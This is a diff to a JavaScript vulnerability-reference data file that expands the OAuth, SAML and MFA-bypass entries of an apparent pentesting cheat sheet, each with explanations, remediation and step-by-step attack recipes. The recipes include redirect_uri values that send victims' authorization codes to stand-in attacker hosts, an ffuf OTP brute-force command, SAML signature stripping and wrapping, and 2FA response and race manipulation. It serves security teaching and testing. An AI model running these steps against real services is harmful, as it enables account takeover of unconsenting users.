@@ -1734,38 +1734,72 @@ var VULNS = [
         "severity": "High",
         "ref": "https://portswigger.net/web-security/oauth",
         "description": "Flaws in an OAuth 2.0 / OIDC implementation — loose redirect URIs, missing state, or weak token handling — lead to account takeover.",
-        "brief": "OAuth 2.0 delegates authentication/authorisation to a provider (Google, Facebook, an internal IdP). The security of the flow rests on a few checks: an exact-match redirect_uri, an unguessable and validated state parameter, and correct validation of the code/token and its audience. When any of these is loose, an attacker can steal authorization codes or tokens, or graft their identity onto a victim's session.\n\nImpact: full account takeover, login CSRF, and cross-account access — often without the victim entering any credentials on the attacker's site.",
+        "brief": "OAuth 2.0 is a delegation protocol: it lets a user grant one application (the client) access to their data or identity held by another (the authorization server / IdP — Google, Facebook, an internal provider). OpenID Connect (OIDC) layers authentication on top, adding an id_token. 'Log in with Google' is the everyday form. The protocol is secure only if a handful of checks are performed correctly, and in practice they frequently are not.\n\nThe core flow (authorization code): the client redirects the user to the provider with client_id, redirect_uri, scope, response_type=code, and a state value; the user consents; the provider redirects back to redirect_uri with a one-time code; the client exchanges that code (server-to-server, with its secret or PKCE verifier) for tokens. The security-critical controls are: redirect_uri must be validated by EXACT match against a registered allow-list; state must be present, unguessable, and bound to the user's session (it is the CSRF token of OAuth); OIDC nonce binds the id_token to the request; the code must be single-use and short-lived; and issued tokens must have their signature, issuer (iss), and audience (aud) validated.\n\nWhen any check is loose the results are severe and often require no victim credentials: a loose redirect_uri leaks the authorization code to an attacker host (then exchanged for the victim's session); a missing state enables login CSRF (the victim is silently logged into the attacker's account, or the attacker's code is grafted onto the victim's session); the implicit flow exposes tokens in the URL fragment; and unverified-email account linking silently merges an attacker identity onto a victim account. The impact is full account takeover across every app behind the SSO.",
         "quickReference": [
-          { "label": "redirect_uri open/loose", "cmd": "redirect_uri=https://target.com.evil.com  or  //evil.com  or  /path/../evil — does it still send the code?" },
-          { "label": "Missing / unvalidated state", "cmd": "# drop or fix the state param -> login CSRF (attach attacker's code to victim session)" },
-          { "label": "Code/token leak via Referer", "cmd": "# ?code=... in the URL leaking to third-party scripts on the callback page" },
-          { "label": "Implicit-flow token in fragment", "cmd": "#access_token=... in the URL fragment on a page you can influence" }
+          { "label": "redirect_uri open/loose", "cmd": "redirect_uri=https://target.com.evil.com  //evil.com  /../evil  ?next=evil  — code still sent?" },
+          { "label": "Missing / unvalidated state", "cmd": "drop or reuse state -> login CSRF (graft attacker code onto victim session)" },
+          { "label": "Code/token leak", "cmd": "?code= in URL leaking via Referer to 3rd-party scripts on the callback page" },
+          { "label": "Implicit-flow token", "cmd": "#access_token= in the fragment on a page you can influence via open redirect/XSS" }
         ],
         "sections": [
-          { "title": "How It's Exploited", "type": "commands", "commands": [
-            { "label": "1. Hijack the code via a loose redirect_uri", "cmd": "# if the provider allows anything but an exact match, point it at your host:\nhttps://provider/authorize?client_id=X&redirect_uri=https://target.evil.com/cb&response_type=code&scope=...\n# the victim's authorization code is delivered to evil.com -> exchange it for their session" },
-            { "label": "2. Login CSRF via missing state", "cmd": "# obtain YOUR code, then force the victim's browser to the callback with it:\nhttps://target/oauth/callback?code=<attacker_code>\n# victim is now logged into the attacker's account and adds data/cards to it" },
-            { "label": "3. Steal the token from the URL", "cmd": "# implicit flow puts #access_token in the fragment; an open redirect or XSS on\n# the callback path, or a leaky Referer, exfiltrates it" },
-            { "label": "4. Account linking without email verification", "cmd": "# link 'Sign in with Google' to an existing account by unverified email -> takeover" }
+          { "title": "How the Flow Works & What Secures It", "type": "notes", "items": [
+            "Roles: resource owner (user), client (the app), authorization server/IdP (issues codes/tokens), resource server (holds the data). OIDC adds an id_token asserting identity.",
+            "Authorization-code flow: client -> /authorize (client_id, redirect_uri, scope, state, response_type=code) -> user consents -> redirect back with ?code -> client exchanges code for tokens on the back channel.",
+            "redirect_uri is the linchpin: it must be validated by exact match against the pre-registered value — any flexibility (subdomain, path, wildcard, extra params) lets an attacker capture the code.",
+            "state is OAuth's CSRF defence: unguessable, bound to the initiating session, verified on return. Absent or unchecked state = login CSRF / code injection.",
+            "Tokens must be validated (signature, iss, aud, exp); the implicit flow (response_type=token) is deprecated because it exposes tokens in the URL — use code + PKCE."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "The /authorize request — inspect redirect_uri handling, presence and validation of state, and whether PKCE (code_challenge) is used.",
+            "The callback endpoint — does it accept a code without a matching state? Does it leak ?code in the URL (Referer, analytics, error pages)?",
+            "'Link account' / 'connect with' flows — test unverified-email linking and pre-account-takeover.",
+            "Any client that uses the implicit flow, or that accepts tokens/codes from a request parameter without back-channel exchange.",
+            "Scope handling and consent — can you upgrade scopes, or reuse a code/token issued for a different client (aud confusion)?"
+          ]},
+          { "title": "Step 1 — Attack redirect_uri", "type": "commands", "commands": [
+            { "label": "Test how loosely it is validated", "cmd": "# vary redirect_uri and see if the provider still returns the code:\nredirect_uri=https://attacker.com\nredirect_uri=https://target.com.attacker.com     # suffix trick\nredirect_uri=https://attacker.com/target.com     # path trick\nredirect_uri=https://target.com/callback/../evil # traversal\nredirect_uri=https://target.com/callback?x=@attacker.com" },
+            { "label": "Hijack the code", "cmd": "# with a working loose redirect, send the victim this authorize URL:\nhttps://provider/authorize?client_id=X&redirect_uri=https://attacker.com/cb&response_type=code&scope=...&state=...\n# the victim's code lands on attacker.com -> exchange it for their tokens/session" },
+            { "label": "Chain an open redirect on an allowed host", "cmd": "# if only target.com paths are allowed, abuse an open redirect there:\nredirect_uri=https://target.com/redirect?url=https://attacker.com\n# the code bounces through the allowed host to you" }
+          ]},
+          { "title": "Step 2 — state, CSRF & Token Theft", "type": "commands", "commands": [
+            { "label": "Login CSRF via missing/reusable state", "cmd": "# 1) start a login yourself, capture YOUR authorization code (do not complete)\n# 2) serve the victim: https://target/oauth/callback?code=<attacker_code>\n# with no state check, the victim is logged into YOUR account -> they add cards/data you can see\n# (or the reverse: inject the victim's code onto your session)" },
+            { "label": "Steal implicit-flow token", "cmd": "# response_type=token puts #access_token in the fragment\n# an open redirect or XSS on the callback page, or a leaky Referer, exfiltrates it\n# also test response_type=token forced on a code client (downgrade)" },
+            { "label": "Code/token leakage via Referer", "cmd": "# if the callback page loads third-party scripts/images while ?code is still in the URL,\n# the code leaks in the Referer header -> capture and exchange it" },
+            { "label": "Account linking / pre-account-takeover", "cmd": "# register the victim's email at the app first (unverified), then have them 'Sign in with Google';\n# if the app links by email without verification, your account merges with theirs\n# or: link your Google to their existing account via an unverified-email path" }
           ]},
           { "title": "Key Checks", "type": "table", "columns": ["Control", "What to verify"], "rows": [
-            ["redirect_uri", "Exact string match against a registered allow-list; no wildcards, path tricks, or subdomains"],
+            ["redirect_uri", "Exact string match vs a registered allow-list; no wildcards, subdomains, path or param tricks"],
             ["state", "Present, unguessable, bound to the session, and validated on return"],
-            ["nonce (OIDC)", "Present and checked to bind the ID token to the request"],
-            ["Authorization code", "Single-use, short-lived, exchanged over the back channel (PKCE for public clients)"],
-            ["Token audience/issuer", "aud and iss validated so a token for another client can't be replayed"],
+            ["nonce (OIDC)", "Present and checked to bind the id_token to this request"],
+            ["PKCE", "code_challenge/verifier used, especially for public/mobile/SPA clients"],
+            ["Authorization code", "Single-use, short-lived, exchanged over the back channel"],
+            ["Token aud / iss / sig", "Validated so a token for another client can't be replayed (aud confusion)"],
             ["Account linking", "Only on a verified email; never silently merge identities"]
           ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Probe redirect_uri / state validation", "A loose control identified"],
+            ["2", "Craft an authorize URL / callback", "Victim's code or token capturable"],
+            ["3", "Deliver to the victim (link)", "Code/token stolen, or session grafted"],
+            ["4", "Exchange code / replay token", "Full account takeover, no victim credentials entered"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Intercept and tamper /authorize and callback requests, test redirect_uri/state"],
+            ["EsPReSSO (Burp)", "SSO/OAuth/SAML testing extension"],
+            ["A hosted attacker endpoint", "Capture leaked codes/tokens delivered to a controlled redirect_uri"],
+            ["jwt_tool", "Inspect/attack id_tokens where OIDC is used"]
+          ]},
           { "title": "References", "type": "references", "items": [
-            { "label": "PortSwigger — OAuth 2.0 authentication vulnerabilities", "url": "https://portswigger.net/web-security/oauth" },
-            { "label": "OAuth 2.0 Security Best Current Practice (RFC 9700)", "url": "https://datatracker.ietf.org/doc/html/rfc9700" }
+            { "label": "PortSwigger — OAuth 2.0 authentication vulnerabilities (with labs)", "url": "https://portswigger.net/web-security/oauth" },
+            { "label": "OAuth 2.0 Security Best Current Practice (RFC 9700)", "url": "https://datatracker.ietf.org/doc/html/rfc9700" },
+            { "label": "OWASP — OAuth security", "url": "https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html" }
           ]},
           { "title": "Remediation", "type": "notes", "items": [
-            "Register and enforce exact redirect_uri values — no wildcards, no partial matches.",
-            "Always generate, bind, and validate a random state parameter (and nonce for OIDC).",
-            "Use the authorization-code flow with PKCE; avoid the implicit flow entirely.",
-            "Validate the token's signature, issuer, audience, and expiry before trusting it.",
-            "Link social identities only on a verified email, and require explicit user confirmation."
+            "Register and enforce exact redirect_uri values — full-string match, no wildcards, no partial/subdomain/path matching, and no attacker-influenced parameters appended.",
+            "Always generate, bind to the session, and validate a random state parameter on the callback; reject any callback without a matching state (and use nonce for OIDC).",
+            "Use the authorization-code flow with PKCE for all clients and avoid the implicit flow entirely; exchange the code over the back channel.",
+            "Validate every token's signature, issuer, audience, and expiry before trusting it, so a token minted for a different client cannot be replayed.",
+            "Keep authorization codes single-use and short-lived, and never expose them in a place that leaks (log, Referer, third-party script).",
+            "Link social identities only after verifying the email with the provider and confirming with the user; never silently merge accounts by email."
           ]}
         ]
       },
@@ -1775,37 +1809,72 @@ var VULNS = [
         "severity": "High",
         "ref": "https://portswigger.net/web-security/saml",
         "description": "Weak validation of SAML assertions — especially signature handling — lets an attacker forge authentication as any user.",
-        "brief": "SAML carries a signed XML assertion from an Identity Provider to a Service Provider stating who the user is. The whole trust model depends on the SP correctly validating that signature and the assertion's contents. Because XML signing is subtle, SPs frequently mis-validate — accepting unsigned assertions, allowing XML Signature Wrapping (XSW), or trusting attacker-controlled fields — which lets an attacker rewrite the NameID and log in as anyone, including administrators.\n\nImpact: complete authentication bypass and privilege escalation across every application behind the SSO.",
+        "brief": "SAML (Security Assertion Markup Language) is an XML-based SSO protocol. An Identity Provider (IdP) issues a digitally signed XML assertion stating who the authenticated user is (the NameID) and their attributes; the Service Provider (SP — the application) consumes that assertion at its Assertion Consumer Service (ACS) endpoint and logs the user in. The entire trust model rests on one thing: the SP correctly validating the XML signature over the assertion, and validating its conditions (audience, timestamps, recipient).\n\nXML digital signatures are notoriously subtle — the signature references a specific element by ID, and the crux of most attacks is creating a document where the signature still verifies against the original, signed element while the SP actually READS a different, attacker-controlled element. This is XML Signature Wrapping (XSW), the signature vulnerability class that has repeatedly broken SAML SSO. Alongside it are simpler failures: accepting an assertion with no signature at all, validating 'a signature is present' rather than 'this element is signed', not checking Audience/Recipient/NotOnOrAfter (enabling replay and cross-app reuse), and XML-comment truncation in the NameID (admin<!---->@evil.com may be read as admin by one parser and admin@evil.com by another).\n\nBecause SAML sits in front of the whole SSO estate, a validation flaw is catastrophic: an attacker rewrites the NameID to any user — including an administrator — and authenticates as them to every application behind the IdP, with no password. SAML XML is also parsed server-side, so it is a prime XXE target (see the XXE entry).",
         "quickReference": [
-          { "label": "Decode the SAMLResponse", "cmd": "echo '<b64>' | base64 -d | xmllint --format -   # (URL-decode first if needed)" },
-          { "label": "Change the identity", "cmd": "edit  <NameID>admin@target.com</NameID>  and resend — accepted without a valid signature?" },
-          { "label": "Signature stripping", "cmd": "remove the <Signature> element entirely — does the SP still accept it?" },
-          { "label": "XML Signature Wrapping (XSW)", "cmd": "keep the signed assertion but add a second, unsigned, attacker-controlled one" }
+          { "label": "Decode the SAMLResponse", "cmd": "urldecode, then: echo '<b64>' | base64 -d | xmllint --format -" },
+          { "label": "Change the identity", "cmd": "edit <NameID>admin@target.com</NameID>, re-encode, resend — accepted?" },
+          { "label": "Signature stripping", "cmd": "remove the <ds:Signature> element entirely — still accepted?" },
+          { "label": "XML Signature Wrapping (XSW)", "cmd": "keep the signed assertion, inject a second unsigned one the SP reads (SAML Raider)" }
         ],
         "sections": [
-          { "title": "How It's Exploited", "type": "commands", "commands": [
-            { "label": "1. Capture and decode the response", "cmd": "# intercept the POST to the SP's ACS endpoint, grab SAMLResponse, then:\necho '<SAMLResponse b64>' | base64 -d | xmllint --format -" },
-            { "label": "2. Tamper the assertion", "cmd": "# change the asserted identity and replay:\n<saml:NameID>administrator@target.com</saml:NameID>\n# base64/deflate + re-encode and send — accepted = broken validation" },
-            { "label": "3. Signature exclusion / stripping", "cmd": "# delete the <ds:Signature> node; a SP that only validates 'if a signature is present'\n# will accept the now-unsigned, attacker-modified assertion" },
-            { "label": "4. XML Signature Wrapping", "cmd": "# use the SAML Raider Burp extension: keep the original signed assertion so the\n# signature verifies, but inject a second assertion the SP actually reads" }
+          { "title": "How SAML Works & Root Cause", "type": "notes", "items": [
+            "Flow (SP-initiated): user hits the SP -> SP redirects to the IdP with an AuthnRequest -> user authenticates -> IdP POSTs a signed SAMLResponse (containing an Assertion) to the SP's ACS endpoint -> SP validates the signature + conditions and logs the user in.",
+            "The signature is an XML Signature (XML-DSig): a <ds:Signature> that references a signed element by its Id via a URI. Security depends on the SP verifying that the element it READS is exactly the element the signature COVERS.",
+            "XSW works by keeping the legitimately signed element (so verification passes) but adding/relocating a second element with attacker-chosen contents that the application logic actually consumes — a mismatch between 'what is verified' and 'what is used'.",
+            "Other failures: no signature required; signature checked only when present; conditions (Audience, Recipient, NotBefore/NotOnOrAfter, InResponseTo) not validated; and XML-comment/parser-differential tricks in the NameID.",
+            "The SAMLResponse is base64 (and sometimes DEFLATE for redirect binding) encoded XML parsed server-side — so XXE and other XML attacks also apply."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "The POST to the SP's ACS/callback endpoint carrying SAMLResponse (base64). This is the assertion you tamper.",
+            "The IdP metadata and signing certificate — needed to understand what should be validated.",
+            "Whether the SP requires the Response, the Assertion, or both to be signed (a common gap: only one is enforced).",
+            "The NameID and any attribute the SP maps to a user/role — these are your forgery targets.",
+            "XML parsing behaviour for XXE (DOCTYPE/entities in the SAMLResponse)."
+          ]},
+          { "title": "Step 1 — Capture, Decode, Baseline", "type": "commands", "commands": [
+            { "label": "Decode the SAMLResponse", "cmd": "# intercept the POST to the ACS endpoint, grab the SAMLResponse param, then:\npython3 -c \"import base64,urllib.parse,sys;print(base64.b64decode(urllib.parse.unquote(sys.argv[1])).decode())\" '<value>'\n# (redirect binding is also DEFLATE-compressed before base64)" },
+            { "label": "Identify what is signed", "cmd": "# note the <ds:Signature> and its <ds:Reference URI=\"#...\"> — which element Id it covers\n# is the Response signed, the Assertion, or both? which does the SP read?" }
+          ]},
+          { "title": "Step 2 — Signature & Assertion Attacks", "type": "commands", "commands": [
+            { "label": "Tamper without re-signing (no/weak validation)", "cmd": "# change the identity and replay:\n<saml:NameID>administrator@target.com</saml:NameID>\n# re-encode (base64, +DEFLATE for redirect) and send — accepted = broken validation" },
+            { "label": "Signature stripping / exclusion", "cmd": "# delete the <ds:Signature> node entirely.\n# an SP that only validates 'if a signature exists' accepts the unsigned, modified assertion" },
+            { "label": "XML Signature Wrapping (XSW)", "cmd": "# with SAML Raider (Burp): apply the XSW1-XSW8 templates.\n# keep the original signed Assertion so the signature verifies, and inject a second\n# Assertion (with your NameID) positioned so the SP's parser reads YOURS.\n# vary placement (before/after, inside Extensions, nested) per SP quirk" },
+            { "label": "XML comment / parser-differential", "cmd": "# some SPs read NameID up to a comment while the signature covered the whole:\n<NameID>admin<!---->@attacker.com</NameID>\n# may authenticate you as 'admin'" },
+            { "label": "Key confusion / self-signed", "cmd": "# if the SP does not pin the IdP cert, re-sign the whole assertion with YOUR key\n# and swap in your certificate (SAML Raider automates the re-sign+cert swap)" }
           ]},
           { "title": "Common Weaknesses", "type": "table", "columns": ["Flaw", "Effect"], "rows": [
             ["Assertion accepted without a signature", "Forge any identity outright"],
-            ["Signature not tied to the read element (XSW)", "Inject an unsigned assertion beside the signed one"],
-            ["No audience / recipient / timestamp checks", "Replay assertions across apps or after expiry"],
-            ["XML comment in NameID (e.g. admin<!---->@x)", "Parser truncation changes the effective identity"],
-            ["Trusting IdP-supplied Issuer/URLs blindly", "SSRF and open-redirect style abuse"]
+            ["'Signature present' checked, not 'this element signed'", "Strip/replace and modify freely"],
+            ["Signature not bound to the read element (XSW)", "Inject an unsigned assertion beside the signed one"],
+            ["IdP certificate not pinned", "Re-sign with an attacker key + swapped cert"],
+            ["No Audience/Recipient/timestamp/InResponseTo checks", "Replay across apps or after expiry"],
+            ["XML comment in NameID (admin<!---->@x)", "Parser truncation changes the effective identity"],
+            ["XML entities processed", "XXE — file read / SSRF via the SAMLResponse"]
+          ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Capture and decode the SAMLResponse", "Understand what is signed and read"],
+            ["2", "Tamper / strip / wrap the assertion", "NameID set to a victim/admin"],
+            ["3", "Re-encode and POST to the ACS", "SP accepts the forged identity"],
+            ["4", "Authenticate as any user across the SSO", "Full auth bypass + privilege escalation"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["SAML Raider (Burp)", "Decode, tamper, XSW templates, re-sign, and certificate swap"],
+            ["Burp Suite", "Intercept the ACS POST and manipulate the SAMLResponse"],
+            ["EsPReSSO (Burp)", "Detect and analyse SSO (SAML/OAuth) messages"],
+            ["xmllint", "Pretty-print and inspect the decoded XML"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "PortSwigger — SAML security", "url": "https://portswigger.net/web-security/saml" },
-            { "label": "SAML Raider (Burp extension)", "url": "https://github.com/CompassSecurity/SAMLRaider" }
+            { "label": "SAML Raider (Burp extension)", "url": "https://github.com/CompassSecurity/SAMLRaider" },
+            { "label": "OWASP — SAML Security Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html" }
           ]},
           { "title": "Remediation", "type": "notes", "items": [
-            "Require a valid signature and reject any assertion that is unsigned or whose signature does not cover the exact element being read.",
-            "Use a hardened, well-maintained SAML library rather than hand-rolled XML parsing, and keep it patched.",
-            "Validate Audience, Recipient, NotBefore/NotOnOrAfter, and InResponseTo on every assertion.",
-            "Canonicalise safely and reject documents with unexpected extra assertions or XML comments in identity fields.",
-            "Pin the IdP's signing certificate and rotate it through a controlled process."
+            "Require a valid signature and reject any assertion that is unsigned or whose signature does not cover the exact element being consumed — validate the reference, not merely the presence of a <Signature>.",
+            "Use a hardened, well-maintained SAML library that is specifically resistant to XML Signature Wrapping; never hand-roll XML/signature parsing, and keep it patched.",
+            "Pin the IdP's signing certificate (or validate against a trusted metadata store) so an attacker-supplied key/cert is rejected.",
+            "Validate all conditions on every assertion: Audience (this SP), Recipient/Destination, NotBefore/NotOnOrAfter, and InResponseTo matching a pending AuthnRequest.",
+            "Disable DTD/external entity processing in the SAML XML parser to prevent XXE, and reject documents with unexpected extra assertions or comments in identity fields.",
+            "Use a strong NameID format, avoid trusting attacker-influenceable URLs from the message, and log/alert on assertion validation failures."
           ]}
         ]
       },
@@ -1815,38 +1884,72 @@ var VULNS = [
         "severity": "High",
         "ref": "https://portswigger.net/web-security/authentication/multi-factor",
         "description": "The one-time-code or second-factor step can be brute-forced, skipped, or bypassed, defeating multi-factor authentication.",
-        "brief": "One-time passwords and second factors are only as strong as the checks around them. Common failures include short numeric codes with no attempt limit (brute-forceable), the ability to reach the post-2FA state without completing the step (flow skipping), trusting a client-controlled response, and race conditions that accept a code more than once. Any of these reduces 'two-factor' back to just the password.\n\nImpact: complete bypass of MFA, leading to account takeover even when the password is known to be protected by a second factor.",
+        "brief": "Multi-factor authentication adds a second proof — a one-time code (SMS/email OTP), a TOTP authenticator, a push approval, or a backup code — on top of the password. It is only as strong as the server-side checks that surround it, and those checks fail in a small set of recurring ways that each collapse 'two factors' back to one.\n\nThe main bypass classes: brute force (a short 4-6 digit numeric code with no attempt limit and a long validity window is guessable in minutes, or instantly if the same code persists across many attempts); flow skipping / forced browsing (after the password step the app issues a partially-authenticated session but does not enforce the 2FA gate on the resources, so you browse straight to the post-2FA page); response manipulation (the client is trusted to report whether the code was correct, so flipping a 401 to 200 or {verified:false} to true logs you in); race conditions (non-atomic verification accepts one code multiple times, or lets you exceed the attempt limit with parallel requests); weak recovery/backup paths (the 'lost your device' or backup-code flow is unthrottled or bypasses 2FA); and code leakage (the OTP is returned in a response/redirect, logged, or predictable).\n\nImpact: full MFA bypass and account takeover even when a password is known to be protected by a second factor — undermining the exact protection MFA was deployed to provide. This entry focuses on the OTP/2FA step specifically; broader login and session flaws are covered under Authentication Bypass.",
         "quickReference": [
-          { "label": "Brute force a short code", "cmd": "# 4-6 digit code, no attempt limit -> Burp Intruder over 000000-999999 in the OTP window" },
-          { "label": "Skip the step", "cmd": "# after password, browse directly to the authenticated page / call the post-2FA endpoint" },
-          { "label": "Response manipulation", "cmd": "# submit a wrong code, change  {\"verified\":false}  ->  true  in the response" },
-          { "label": "Reuse / race the code", "cmd": "# send many verify requests in parallel; is one code accepted twice, or the limit skipped?" }
+          { "label": "Brute force a short code", "cmd": "4-6 digit code, weak/no limit -> Turbo Intruder over 000000-999999 within the window" },
+          { "label": "Skip the step", "cmd": "after password, browse directly to the authenticated page / call /login/complete" },
+          { "label": "Response manipulation", "cmd": "submit a wrong code, flip 401->200 or {\"verified\":false}->true in the response" },
+          { "label": "Reuse / race the code", "cmd": "fire many verify requests in parallel; code accepted twice or limit skipped?" }
         ],
         "sections": [
-          { "title": "How It's Exploited", "type": "commands", "commands": [
-            { "label": "1. Brute force with no rate limit", "cmd": "# capture the verify request, then Intruder / ffuf across all codes:\nffuf -w codes.txt -X POST -d 'otp=FUZZ' -u https://target/2fa/verify -H 'Cookie: <pre-2fa session>'\n# a valid session that outlives many attempts = brute-forceable" },
-            { "label": "2. Flow skipping (broken state)", "cmd": "# 1) submit username+password -> receive a 'needs 2FA' session\n# 2) instead of verifying, request an authenticated page or the final /login/complete\n# if it succeeds, the 2FA gate is not enforced server-side" },
-            { "label": "3. Response / status manipulation", "cmd": "# submit an invalid code, then edit the response in Burp:\n#   HTTP/1.1 401  ->  200\n#   {\"success\":false} -> {\"success\":true}\n# a client that trusts the response lets you in" },
-            { "label": "4. Reuse, race, and backup-code abuse", "cmd": "# fire N parallel verify requests (race) to accept one code multiple times;\n# also test whether old codes stay valid and whether backup codes are rate-limited" }
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "MFA security lives entirely server-side: the server must enforce that a protected session is only reached after a correctly verified, single-use, time-bound second factor.",
+            "The common root causes are: no/weak rate limiting on the verify endpoint; the 2FA requirement not enforced on the resource (only in the UI flow); trusting a client-reported result; and non-atomic verification.",
+            "A 'partially authenticated' session (post-password, pre-2FA) is the danger zone — if it can act like a full session, 2FA is decorative.",
+            "OTP entropy and lifetime matter: a 6-digit code is only a million possibilities; without a hard attempt cap and a short window, that is brute-forceable.",
+            "Recovery and backup paths are part of the attack surface — a weak 'lost device' flow bypasses the strong factor entirely."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "The OTP verify endpoint after login (rate limits, lockout, code lifetime, single-use).",
+            "The step-up 2FA on sensitive actions (change email/password, add payee) — often weaker than login 2FA.",
+            "The post-password session: try reaching authenticated pages or the 'complete login' call without verifying.",
+            "The verify RESPONSE: is a success flag / status the client acts on?",
+            "Recovery flows: SMS/email OTP resend, backup codes, 'lost authenticator', and whether disabling 2FA needs re-auth."
+          ]},
+          { "title": "Step 1 — Brute Force & Rate Limits", "type": "commands", "commands": [
+            { "label": "Brute the code", "cmd": "# capture the verify request with the pre-2FA session cookie, then:\nffuf -w <(seq -w 0 999999) -X POST -d 'otp=FUZZ' \\\n  -u https://target/2fa/verify -H 'Cookie: <pre-2fa session>' -mc 200 -fr 'invalid'\n# Burp Turbo Intruder for speed within the validity window" },
+            { "label": "Probe the limit's shape", "cmd": "# is the limit per-code, per-session, or per-IP?\n# does requesting a NEW code reset the attempt counter? (send code, guess a few, resend, repeat)\n# does the limit reset on re-login? does an X-Forwarded-For change bypass an IP limit?" },
+            { "label": "Check code lifetime & reuse", "cmd": "# does an old code still work minutes later? is a used code accepted again?\n# is the same code issued repeatedly, or predictable from a timestamp/seed?" }
+          ]},
+          { "title": "Step 2 — Skip, Manipulate, Race", "type": "commands", "commands": [
+            { "label": "Flow skipping / forced browsing", "cmd": "# 1) submit username+password -> get the 'needs 2FA' session\n# 2) DON'T verify — request an authenticated page or the final step directly:\nGET /account         Cookie: <pre-2fa session>\nPOST /login/complete Cookie: <pre-2fa session>\n# success = the 2FA gate isn't enforced on the resource" },
+            { "label": "Response / status manipulation", "cmd": "# submit ANY code, then edit the response in Burp:\nHTTP/1.1 401  ->  200\n{\"success\":false} -> {\"success\":true}\n{\"mfa\":\"required\"} -> {\"mfa\":\"passed\"}\n# a client that trusts the response proceeds to the authenticated state" },
+            { "label": "Race condition", "cmd": "# send N verify requests simultaneously (Burp 'send group in parallel' / single-packet):\n# a non-atomic check may accept one code multiple times, or let you exceed the attempt cap\n# (also useful to beat a per-code limit while brute forcing)" },
+            { "label": "Recovery & backup abuse", "cmd": "# brute or replay backup codes if unthrottled; abuse SMS/email resend to flood or\n# to swap to a weaker channel; test whether 'disable 2FA' requires re-authentication\n# also: is the OTP leaked in a response body, redirect, or JS?" }
           ]},
           { "title": "Bypass Classes", "type": "table", "columns": ["Class", "Root cause"], "rows": [
-            ["Brute force", "Short code + no attempt limit + long validity window"],
+            ["Brute force", "Short code + no/weak attempt limit + long validity window"],
+            ["Limit reset abuse", "Requesting a new code or re-login resets the attempt counter"],
             ["Flow skipping", "Post-2FA state reachable without completing 2FA"],
             ["Response manipulation", "Client trusts a server response the attacker can edit"],
-            ["Race condition", "Non-atomic verification accepts a code more than once"],
-            ["Weak reset/backup path", "Disable 2FA or recover via an unprotected channel"],
-            ["Code leakage", "OTP returned in a response, log, or predictable from a seed"]
+            ["Race condition", "Non-atomic verification accepts a code more than once / exceeds the cap"],
+            ["Weak reset/backup path", "Disable 2FA or recover via an unprotected/weaker channel"],
+            ["Code leakage / predictability", "OTP returned in a response, logged, or derivable from a seed"]
+          ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Obtain valid password (or reach the 2FA step)", "Pre-2FA session"],
+            ["2", "Brute / skip / manipulate / race the 2FA check", "Second factor defeated"],
+            ["3", "Reach the authenticated session", "Full MFA bypass"],
+            ["4", "Take over the account", "Access despite MFA being enabled"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite (Turbo Intruder)", "High-rate OTP brute force and parallel race requests"],
+            ["Burp Repeater", "Response manipulation and flow-skipping tests"],
+            ["ffuf", "Scripted brute force of the verify endpoint"],
+            ["custom scripts", "Automate limit-reset and code-lifetime probing"]
           ]},
           { "title": "References", "type": "references", "items": [
-            { "label": "PortSwigger — Multi-factor authentication bypass", "url": "https://portswigger.net/web-security/authentication/multi-factor" },
-            { "label": "OWASP — Testing for Weaker Authentication in Alternative Channel", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" }
+            { "label": "PortSwigger — Multi-factor authentication bypass (with labs)", "url": "https://portswigger.net/web-security/authentication/multi-factor" },
+            { "label": "OWASP — Multifactor Authentication Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html" },
+            { "label": "OWASP WSTG — Testing Multi-Factor Authentication", "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/" }
           ]},
           { "title": "Remediation", "type": "notes", "items": [
-            "Strictly rate-limit and lock the OTP step, invalidate the code after a few failures, and keep the validity window short (30-60s for TOTP).",
-            "Enforce the 2FA requirement server-side on the session; never allow the authenticated state to be reached without it.",
-            "Make verification atomic and single-use to remove races and code reuse.",
-            "Never return the code or a trustable success flag to the client; decide server-side.",
-            "Protect the reset/backup and 'disable 2FA' paths with the same rigour as the primary factor."
+            "Strictly rate-limit and lock the OTP verify step, invalidate the code after a few failures, and keep the validity window short (30-60s for TOTP); ensure the limit cannot be reset by requesting a new code or re-logging in.",
+            "Enforce the 2FA requirement server-side on the session state itself — a partially-authenticated session must be unable to access any protected resource or complete login.",
+            "Make verification atomic and single-use so races and code reuse are impossible; consume the code in the same transaction that checks it.",
+            "Never return the code or a client-trusted success flag; decide the outcome entirely server-side.",
+            "Use sufficient code entropy (prefer TOTP/WebAuthn over SMS) and bind the code to the specific user and session.",
+            "Protect recovery, backup-code, and 'disable 2FA' paths with the same rate-limiting and re-authentication rigour as the primary factor."
           ]}
         ]
       },
@@ -2448,37 +2551,77 @@ var VULNS = [
         "severity": "High",
         "ref": "https://portswigger.net/web-security/request-smuggling",
         "description": "A front-end and back-end server disagree on where a request ends, letting an attacker smuggle a hidden request that affects other users.",
